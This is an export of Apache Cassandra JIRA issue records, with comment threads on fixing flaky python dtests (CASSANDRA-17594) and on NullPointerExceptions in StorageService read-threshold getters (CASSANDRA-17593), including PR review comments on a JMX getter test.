-------------------------------------------------------------------------- generated xml file: /parallel-ci/output/pytest_result.xml ---------------------------------------------------------------------------
========================================================================================== 1 passed in 87.70 seconds ===========================================================================================
bash-4.2$
{code};;;","04/May/22 20:03;dcapwell;To be more clear, this is the bug with conftest.py 

* error is non-empty, so we validate its not """" and re-add to errors array
* we then ""break"" but this doesn't take us out of the top loop, but just the inner loop; if error is size 2, we only look at the first error
* we *override* error with next node, which has 0 errors
* we see errors is empty, so mark test success

so I will fix this, just need to update each test to include the new errors being detected;;;","04/May/22 21:14;maedhroz;+1;;;","06/May/22 15:58;dcapwell;[~e.dimitrova] found this doesn't catch all cases, so reopening;;;","06/May/22 17:36;dcapwell;Can checkout CI status at
        https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_cassandra-3.0&filter=all
        https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_cassandra-3.11&filter=all
        https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_cassandra-4.0&filter=all
        https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_cassandra-4.1&filter=all
        https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_trunk&filter=all;;;","06/May/22 18:17;dcapwell;A few issues are showing up, and just hiding the logs isn't a solution as they show real bugs...

{code}
ERROR [RepairJobTask:2] 2022-05-06 17:20:15,757 SystemDistributedKeyspace.java:222 - Error executing query UPDATE system_distributed.repair_history SET status = 'FAILED', finished_at = toTimestamp(now()), exception_message=?, exception_stacktrace=? WHERE keyspace_name = 'keyspace1' AND columnfamily_name = 'standard1' AND id = c3ff84a0-cd60-11ec-8ac5-4b7fd7730840
java.lang.AssertionError: java.lang.InterruptedException
  at org.apache.cassandra.net.OutboundTcpConnection.enqueue(OutboundTcpConnection.java:187)
  at org.apache.cassandra.net.MessagingService.sendOneWay(MessagingService.java:794)
  at org.apache.cassandra.net.MessagingService.sendRR(MessagingService.java:756)
  at org.apache.cassandra.service.StorageProxy.sendToHintedEndpoints(StorageProxy.java:1314)
  at org.apache.cassandra.service.StorageProxy$2.apply(StorageProxy.java:137)
  at org.apache.cassandra.service.StorageProxy.performWrite(StorageProxy.java:1151)
  at org.apache.cassandra.service.StorageProxy.mutate(StorageProxy.java:710)
  at org.apache.cassandra.service.StorageProxy.mutateWithTriggers(StorageProxy.java:931)
  at org.apache.cassandra.cql3.statements.ModificationStatement.executeWithoutCondition(ModificationStatement.java:434)
  at org.apache.cassandra.cql3.statements.ModificationStatement.execute(ModificationStatement.java:420)
  at org.apache.cassandra.cql3.QueryProcessor.processStatement(QueryProcessor.java:219)
  at org.apache.cassandra.cql3.QueryProcessor.process(QueryProcessor.java:250)
  at org.apache.cassandra.cql3.QueryProcessor.process(QueryProcessor.java:265)
  at org.apache.cassandra.repair.SystemDistributedKeyspace.processSilent(SystemDistributedKeyspace.java:218)
  at org.apache.cassandra.repair.SystemDistributedKeyspace.failedRepairJob(SystemDistributedKeyspace.java:206)
  at org.apache.cassandra.repair.RepairJob$3.onFailure(RepairJob.java:132)
  at com.google.common.util.concurrent.Futures$6.run(Futures.java:1313)
  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
  at org.apache.cassandra.concurrent.NamedThreadFactory.lambda$threadLocalDeallocator$0(NamedThreadFactory.java:83)
  at java.lang.Thread.run(Thread.java:748)
Caused by: java.lang.InterruptedException: null
  at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireInterruptibly(AbstractQueuedSynchronizer.java:1220)
  at java.util.concurrent.locks.ReentrantLock.lockInterruptibly(ReentrantLock.java:335)
  at java.util.concurrent.LinkedBlockingQueue.put(LinkedBlockingQueue.java:339)
  at org.apache.cassandra.net.OutboundTcpConnection.enqueue(OutboundTcpConnection.java:183)
  ... 20 common frames omitted
{code}

I know [~maedhroz] was looking at this a while back, but repair interrupts and read/write path assumes we don't do that, which can cause issues... so we should avoid interrupting. 

{code}
WARN  [epollEventLoopGroup-2-14] 2022-05-06 17:15:19,006 NoSpamLogger.java:94 - Protocol exception with client networking: org.apache.cassandra.transport.ProtocolException: Invalid or unsupported protocol version (5); the lowest supported version is 3 and the greatest is 4
{code}

the code requests v4 and attempts to connect to node1... yet node2 sees a connection of v5... I can't explain this one yet so not sure if python-dtest or python-driver related. ;;;","06/May/22 18:43;dcapwell;the first issue is CASSANDRA-17466, which is fixed in 4.x but not 3.x... so guess we can ignore in 3.x...;;;","16/May/22 20:20;dcapwell;Spoke to [~samt] and seems the below error is expected behavior

{code}
[node1] 'WARN  [epollEventLoopGroup-2-7] 2022-05-16 19:59:46,595 NoSpamLogger.java:94 - Protocol exception with client networking: org.apache.cassandra.transport.ProtocolException: Invalid or unsupported protocol version (5); the lowest supported version is 3 and the greatest is 4'
{code}

so will need to include that in the global list...;;;","16/May/22 21:50;dcapwell;DSE_V1 and V2 were also found; so added to the allow list;;;","16/May/22 23:00;dcapwell;3.0 is green;;;","16/May/22 23:00;dcapwell;4.0 is green;;;","17/May/22 01:33;dcapwell;4.1 is green;;;","17/May/22 16:11;dcapwell;trunk is green;;;","17/May/22 16:12;dcapwell;3.11 has an issue with beta version which wasn't getting ignored with my patch, working on it;;;","17/May/22 18:28;dcapwell;3.11 is yellow... python-dtest is green, but upgrade had failures.  Since this core logic is on shutdown log detection, non failed due to that so calling it green.;;;","17/May/22 21:22;maedhroz;+1;;;","19/May/22 20:13;e.dimitrova;Can you post the CI runs, please?

Also, thanks for fixing Travis formatting. The build is no kicking it. Not sure why sometimes it happens but I ran all checks and tests locally and I can confirm that they pass with the latest patches.

What is the reason for not fixing in 3.x and considering it is fine to ignore the error msgs for CASSANDRA-17466?

Also, not sure about the other two repair tests, if you can provide a bit of background info, please. Thanks!;;;","19/May/22 21:17;dcapwell;CI runs are

https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_cassandra-3.0&filter=all
https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_cassandra-3.11&filter=all
https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_cassandra-4.0&filter=all
https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_cassandra-4.1&filter=all
https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=ci/python-dtest_CASSANDRA-17594_attempt_2_trunk&filter=all;;;","19/May/22 21:18;dcapwell;bq. What is the reason for not fixing in 3.x and considering it is fine to ignore the error msgs for CASSANDRA-17466?

Because back porting that fix to 3.x would be its own effort, so I felt it was out of scope for this ticket.  That behavior has been around for a long time so if you were bitten by it... upgrade to 4.0? =D;;;","19/May/22 21:20;dcapwell;Replied in PR for the repair tests

{code}
This is the log we generate when we skip repair due to no data (or no tables, etc.); this test does *not* write data, so skipping repair is the expected behavior
{code};;;","19/May/22 21:31;e.dimitrova;{quote}CI runs are
{quote}
Thanks! I think we miss only the python upgrade tests for 3.0
{quote}Because back porting that fix to 3.x would be its own effort, so I felt it was out of scope for this ticket. That behavior has been around for a long time so if you were bitten by it... upgrade to 4.0? =D
{quote}
While we often agree to not backport something, I am not sure that is what the community wants here? If we are going to silently ignore this bug in our tests, I would like to see some visibility and common agreement on that.

My concerns – the original ticket is critical and mentions the bug affects availability but it doesn't even mention that the issue exists on previous versions. It is said it is there since 4.0? While I absolutely do not expect fixing the problem or porting the patch here as part of this ticket, I am not sure we should just decide to silence it. Probably [~maedhroz] can comment better as the person most familiar with that problem. ;;;","19/May/22 21:45;brandon.williams;bq. so if you were bitten by it... upgrade to 4.0?

3.0 and 3.11 are supported for another year, so I'm not sure we can suggest upgrading to get around bugs if this happens.;;;","19/May/22 22:25;e.dimitrova;Also, why is it fine to exclude errors by default and not on per case basis? Why do DSE popped up? I think I have to do one more pass on this tomorrow carefully.

And again, if the original patch exposed more unrelated bugs, I don’t expect all of them to be fixed in one ticket. If additional tickets are needed and more work and attention - I am fine with that. ;;;","20/May/22 19:02;dcapwell;bq. Also, why is it fine to exclude errors by default and not on per case basis?

Some errors are generic and can happen in 100% of tests, such as connection shutdown early; we would need to update 100% of tests to include this default list

bq. Why do DSE popped up? 

I wasn't 100% sure of this as well, was confusing why it wasn't more present...

Talked with [~samt] and client protocol negotiation uses highest version it knows and moves down the list until server stops rejecting, in python driver the ""highest"" versions are DSE_v2 then V1 (linked source but linter got made, so gave all parts needed to get the link <_<...

What I couldn't figure out was why was it only 2 tests that hit DSE and the rest were complaining about v5?;;;","20/May/22 19:53;dcapwell;Missed that CASSANDRA-17466 did close SSTables, thought it just interrupted queries... yeah, its a bad bug that prob should be back ported; should I remove that restriction in the patch and leave it flaky for 3.x?;;;","20/May/22 20:10;dcapwell;I can create another ticket to backport CASSANDRA-17466 and leave it flaky in this patch; [~e.dimitrova] [~brandon.williams] works for you?;;;","20/May/22 20:11;e.dimitrova;{quote}Some errors are generic
{quote}
I want to be sure that there is no case when they might be actually useful. 
{quote}What I couldn't figure out was why was it only 2 tests that hit DSE and the rest were complaining about v5?
{quote}
Can you try to verify this one, please?
{quote}should I remove that restriction in the patch and leave it flaky for 3.x?
{quote}
I personally think that opening a new separate ticket and not silencing those is the right thing to do.

Unfortunately, I will be off until Thursday, so I don't mind if someone takes over the review of this one in the meantime and a patch gets merged when everything is confirmed and ready. I don't want to block it. But I do have concerns and we need to be very, very careful with all errors we silence, especially when it is done broadly. I am -1 on silencing 17466, +0 on the rest as it needs confirmations. Not blocking, but want to be verified very carefully.;;;","20/May/22 20:27;dcapwell;reverted and will open a new ticket to backport to 3.0;;;","20/May/22 20:38;dcapwell;Created CASSANDRA-17648 to backport;;;","20/May/22 21:05;brandon.williams;That works for me, thanks.;;;","31/May/22 22:24;dcapwell;PR is ready to review; [~jonmeredith] is looking now;;;","01/Jun/22 17:02;jonmeredith;+1 - it's hard to tell how the dtest runs really went after time/changes, but I think it's good. Will double-check Jenkins once this merges.;;;","01/Jun/22 17:57;dcapwell;latest commit

{code}
commit 7bc8467233af69391efeaf74ef87a73c0ea9ceb1 (HEAD -> trunk, upstream/trunk)
Author: David Capwell <dcapwell@gmail.com>
Date:   Wed Jun 1 10:57:09 2022 -0700

    Fix flaky python-tests due to connection getting closed
    Patch by David Capwell; reviewed by Caleb Rackliffe for CASSANDRA-17594
{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
StorageService read threshold get methods throw NullPointerException due to not handling null configs,CASSANDRA-17593,13442835,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,02/May/22 17:26,17/Jun/22 07:40,13/Jul/23 08:40,10/May/22 19:45,4.1,4.1-alpha1,,,,,Observability/JMX,,,,0,,"org.apache.cassandra.service.StorageService#getCoordinatorLargeReadWarnThreshold and other similar get methods touch the following null configs

{code}
public volatile DataStorageSpec coordinator_read_size_warn_threshold = null;
public volatile DataStorageSpec coordinator_read_size_fail_threshold = null;
public volatile DataStorageSpec local_read_size_warn_threshold = null;
public volatile DataStorageSpec local_read_size_fail_threshold = null;
public volatile DataStorageSpec row_index_read_size_warn_threshold = null;
public volatile DataStorageSpec row_index_read_size_fail_threshold = null
{code}

Null is a valid state for these configs, so null must be handled in the get methods; they currently are not and throw NullPointerException when accessed via JMX",,bereng,dcapwell,e.dimitrova,jmckenzie,,,,,,,,,,,"dcapwell commented on code in PR #1606:
URL: https://github.com/apache/cassandra/pull/1606#discussion_r866334835


##########
src/java/org/apache/cassandra/locator/TokenMetadata.java:
##########
@@ -601,7 +601,7 @@ public Collection<Token> getTokens(InetAddressAndPort endpoint)
         lock.readLock().lock();
         try
         {
-            assert isMember(endpoint); // don't want to return nulls
+            assert isMember(endpoint): String.format(""Unable to get tokens for %s; it is not a member"", endpoint); // don't want to return nulls

Review Comment:
   was found in testing, I don't like `null` messages, so added message



;05/May/22 21:39;githubbot;600","bereng commented on code in PR #1606:
URL: https://github.com/apache/cassandra/pull/1606#discussion_r867644170


##########
test/distributed/org/apache/cassandra/distributed/test/jmx/JMXGetterCheckTest.java:
##########
@@ -0,0 +1,143 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.distributed.test.jmx;
+
+import java.net.InetAddress;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+import java.util.Set;
+import java.util.TreeSet;
+import javax.management.JMRuntimeException;
+import javax.management.MBeanAttributeInfo;
+import javax.management.MBeanInfo;
+import javax.management.MBeanOperationInfo;
+import javax.management.MBeanServerConnection;
+import javax.management.ObjectName;
+import javax.management.remote.JMXConnector;
+import javax.management.remote.JMXConnectorFactory;
+import javax.management.remote.JMXConnectorServer;
+import javax.management.remote.JMXServiceURL;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.Feature;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.JMXServerUtils;
+
+import static org.apache.cassandra.config.CassandraRelevantProperties.IS_DISABLED_MBEAN_REGISTRATION;
+import static org.apache.cassandra.cql3.CQLTester.getAutomaticallyAllocatedPort;
+
+public class JMXGetterCheckTest extends TestBaseImpl
+{
+    private static final Set<String> IGNORE_ATTRIBUTES = ImmutableSet.of(
+    ""org.apache.cassandra.net:type=MessagingService:BackPressurePerHost"" // throws unsupported saying the feature was removed... this feels like a regression...

Review Comment:
   Should a ticket be created for this?



;09/May/22 05:36;githubbot;600","bereng commented on code in PR #1606:
URL: https://github.com/apache/cassandra/pull/1606#discussion_r867645414


##########
test/distributed/org/apache/cassandra/distributed/test/jmx/JMXGetterCheckTest.java:
##########
@@ -0,0 +1,143 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.distributed.test.jmx;
+
+import java.net.InetAddress;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+import java.util.Set;
+import java.util.TreeSet;
+import javax.management.JMRuntimeException;
+import javax.management.MBeanAttributeInfo;
+import javax.management.MBeanInfo;
+import javax.management.MBeanOperationInfo;
+import javax.management.MBeanServerConnection;
+import javax.management.ObjectName;
+import javax.management.remote.JMXConnector;
+import javax.management.remote.JMXConnectorFactory;
+import javax.management.remote.JMXConnectorServer;
+import javax.management.remote.JMXServiceURL;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.Feature;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.JMXServerUtils;
+
+import static org.apache.cassandra.config.CassandraRelevantProperties.IS_DISABLED_MBEAN_REGISTRATION;
+import static org.apache.cassandra.cql3.CQLTester.getAutomaticallyAllocatedPort;
+
+public class JMXGetterCheckTest extends TestBaseImpl
+{
+    private static final Set<String> IGNORE_ATTRIBUTES = ImmutableSet.of(
+    ""org.apache.cassandra.net:type=MessagingService:BackPressurePerHost"" // throws unsupported saying the feature was removed... this feels like a regression...
+    );
+    private static final Set<String> IGNORE_OPERATIONS = ImmutableSet.of(
+    ""org.apache.cassandra.db:type=StorageService:stopDaemon"", // halts the instance, which then causes the JVM to exit
+    ""org.apache.cassandra.db:type=StorageService:drain"", // don't drain, it stops things which can cause other APIs to be unstable as we are in a stopped state
+    ""org.apache.cassandra.db:type=StorageService:stopGossiping"" // if we stop gossip this can causes other issues, so avoid
+    );
+
+    @Test
+    public void test() throws Exception
+    {
+        // start JMX server, which the instance will register with
+        InetAddress loopback = InetAddress.getLoopbackAddress();

Review Comment:
   Asking genuinely from my ignorance with jvm dtests: isn't/shouldn't there be helpers to do JMX in  the jvm-dtest package so you don't have to handcraft it? Maybe we could add this now or maybe it's food for another ticket. Wdyt?



;09/May/22 05:39;githubbot;600","dcapwell commented on code in PR #1606:
URL: https://github.com/apache/cassandra/pull/1606#discussion_r868385460


##########
test/distributed/org/apache/cassandra/distributed/test/jmx/JMXGetterCheckTest.java:
##########
@@ -0,0 +1,143 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.distributed.test.jmx;
+
+import java.net.InetAddress;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+import java.util.Set;
+import java.util.TreeSet;
+import javax.management.JMRuntimeException;
+import javax.management.MBeanAttributeInfo;
+import javax.management.MBeanInfo;
+import javax.management.MBeanOperationInfo;
+import javax.management.MBeanServerConnection;
+import javax.management.ObjectName;
+import javax.management.remote.JMXConnector;
+import javax.management.remote.JMXConnectorFactory;
+import javax.management.remote.JMXConnectorServer;
+import javax.management.remote.JMXServiceURL;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.Feature;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.JMXServerUtils;
+
+import static org.apache.cassandra.config.CassandraRelevantProperties.IS_DISABLED_MBEAN_REGISTRATION;
+import static org.apache.cassandra.cql3.CQLTester.getAutomaticallyAllocatedPort;
+
+public class JMXGetterCheckTest extends TestBaseImpl
+{
+    private static final Set<String> IGNORE_ATTRIBUTES = ImmutableSet.of(
+    ""org.apache.cassandra.net:type=MessagingService:BackPressurePerHost"" // throws unsupported saying the feature was removed... this feels like a regression...
+    );
+    private static final Set<String> IGNORE_OPERATIONS = ImmutableSet.of(
+    ""org.apache.cassandra.db:type=StorageService:stopDaemon"", // halts the instance, which then causes the JVM to exit
+    ""org.apache.cassandra.db:type=StorageService:drain"", // don't drain, it stops things which can cause other APIs to be unstable as we are in a stopped state
+    ""org.apache.cassandra.db:type=StorageService:stopGossiping"" // if we stop gossip this can causes other issues, so avoid
+    );
+
+    @Test
+    public void test() throws Exception
+    {
+        // start JMX server, which the instance will register with
+        InetAddress loopback = InetAddress.getLoopbackAddress();

Review Comment:
   > there be helpers to do JMX in the jvm-dtest package
   
   JMX can not be isolated in the ClassLoader (or at least the last attempt failed), so its global; due to this reason we don't normally do JMX in dtest, but we do support Metrics, which is part of the API (rather than register with JMX, we register with a global map)
   
   > shouldn't there be helpers 
   
   Personally I don't like helpers until there are more than 1 usage



;09/May/22 19:51;githubbot;600","dcapwell commented on code in PR #1606:
URL: https://github.com/apache/cassandra/pull/1606#discussion_r868389726


##########
test/distributed/org/apache/cassandra/distributed/test/jmx/JMXGetterCheckTest.java:
##########
@@ -0,0 +1,143 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.distributed.test.jmx;
+
+import java.net.InetAddress;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+import java.util.Set;
+import java.util.TreeSet;
+import javax.management.JMRuntimeException;
+import javax.management.MBeanAttributeInfo;
+import javax.management.MBeanInfo;
+import javax.management.MBeanOperationInfo;
+import javax.management.MBeanServerConnection;
+import javax.management.ObjectName;
+import javax.management.remote.JMXConnector;
+import javax.management.remote.JMXConnectorFactory;
+import javax.management.remote.JMXConnectorServer;
+import javax.management.remote.JMXServiceURL;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.Feature;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.JMXServerUtils;
+
+import static org.apache.cassandra.config.CassandraRelevantProperties.IS_DISABLED_MBEAN_REGISTRATION;
+import static org.apache.cassandra.cql3.CQLTester.getAutomaticallyAllocatedPort;
+
+public class JMXGetterCheckTest extends TestBaseImpl
+{
+    private static final Set<String> IGNORE_ATTRIBUTES = ImmutableSet.of(
+    ""org.apache.cassandra.net:type=MessagingService:BackPressurePerHost"" // throws unsupported saying the feature was removed... this feels like a regression...

Review Comment:
   looks like it was removed in https://issues.apache.org/jira/browse/CASSANDRA-15375



;09/May/22 19:55;githubbot;600","dcapwell commented on code in PR #1606:
URL: https://github.com/apache/cassandra/pull/1606#discussion_r868392690


##########
test/distributed/org/apache/cassandra/distributed/test/jmx/JMXGetterCheckTest.java:
##########
@@ -0,0 +1,143 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+package org.apache.cassandra.distributed.test.jmx;
+
+import java.net.InetAddress;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
+import java.util.Set;
+import java.util.TreeSet;
+import javax.management.JMRuntimeException;
+import javax.management.MBeanAttributeInfo;
+import javax.management.MBeanInfo;
+import javax.management.MBeanOperationInfo;
+import javax.management.MBeanServerConnection;
+import javax.management.ObjectName;
+import javax.management.remote.JMXConnector;
+import javax.management.remote.JMXConnectorFactory;
+import javax.management.remote.JMXConnectorServer;
+import javax.management.remote.JMXServiceURL;
+
+import com.google.common.collect.ImmutableSet;
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+import org.apache.cassandra.distributed.api.Feature;
+import org.apache.cassandra.distributed.test.TestBaseImpl;
+import org.apache.cassandra.utils.JMXServerUtils;
+
+import static org.apache.cassandra.config.CassandraRelevantProperties.IS_DISABLED_MBEAN_REGISTRATION;
+import static org.apache.cassandra.cql3.CQLTester.getAutomaticallyAllocatedPort;
+
+public class JMXGetterCheckTest extends TestBaseImpl
+{
+    private static final Set<String> IGNORE_ATTRIBUTES = ImmutableSet.of(
+    ""org.apache.cassandra.net:type=MessagingService:BackPressurePerHost"" // throws unsupported saying the feature was removed... this feels like a regression...

Review Comment:
   updated comment to say what JIRA removed.



;09/May/22 19:57;githubbot;600","smiklosovic closed pull request #1606: CASSANDRA-17593: StorageService read threshold get methods throw NullPointerException due to not handling null configs
URL: https://github.com/apache/cassandra/pull/1606


;17/Jun/22 07:40;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4200,,,0,4200,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Transient Incorrect Response,,,,,,,,Low Hanging Fruit,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed May 11 15:53:30 UTC 2022,,,,,,,All,,,,"0|z12034:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra/commit/7c4c30dc60f58312a5db5f02d2cfa222808d759d,,,,,,,,,added tests,,,,,"02/May/22 17:29;dcapwell;it would be good to have a test which generically catches this as I feel this wouldn't be the only place impacted.;;;","09/May/22 05:40;bereng;Overall approach with nullable annotations etc lgmt and I dropped a few comments. But CI has many failures, probably related to the hints service stop, let's hope it's a quick one to fix :-);;;","09/May/22 20:07;dcapwell;[~bereng] fixed the tests; it is a init issue where HintService init happens on shutdown, and touches a thread pool that was halted.;;;","10/May/22 05:20;bereng;LGTM +1;;;","10/May/22 17:01;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17593-cassandra-4.1-DE580542-E93B-4970-B02F-6D7DBAFCE3B5]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17593-cassandra-4.1-DE580542-E93B-4970-B02F-6D7DBAFCE3B5]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1697/]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17593-trunk-DE580542-E93B-4970-B02F-6D7DBAFCE3B5]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17593-trunk-DE580542-E93B-4970-B02F-6D7DBAFCE3B5]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1698/]|
;;;","11/May/22 15:53;jmckenzie;Only 1 new test failure on ASF infra that's not accounted for, and without digging into the code here or there I would assume they're unrelated (org.apache.cassandra.cql3.validation.operations.InsertUpdateIfConditionTest.testConditionalDelete[1: clusterMinVersion=3.11]-compression)

 

[CI Results]
Branch: 4.1, build number: 12
butler url: [https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1]
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-4.1/12/]
JIRA: CASSANDRA-17593
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=6396562f71316838083618714b142fd982ae0155]
affected paths:
 * test/unit/org/apache/cassandra/cql3/CQLTester.java
 * test/distributed/org/apache/cassandra/distributed/impl/Instance.java
 * test/distributed/org/apache/cassandra/distributed/test/jmx/JMXGetterCheckTest.java
 * src/java/org/apache/cassandra/locator/TokenMetadata.java
 * src/java/org/apache/cassandra/config/DatabaseDescriptor.java
 * src/java/org/apache/cassandra/service/StorageService.java
 * CHANGES.txt

Build Result: UNSTABLE
Passing Tests: 48673
Failing Tests: 7
||Test|Failures|JIRA|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade_with_internode_ssl|1 of 10|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestProtoV3Upgrade*%22]|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome|3 of 10|CASSANDRA-17301?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade|1 of 10|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestProtoV3Upgrade*%22]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_parallel_upgrade|2 of 10|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20%22*TestProtoV3Upgrade*%22]|
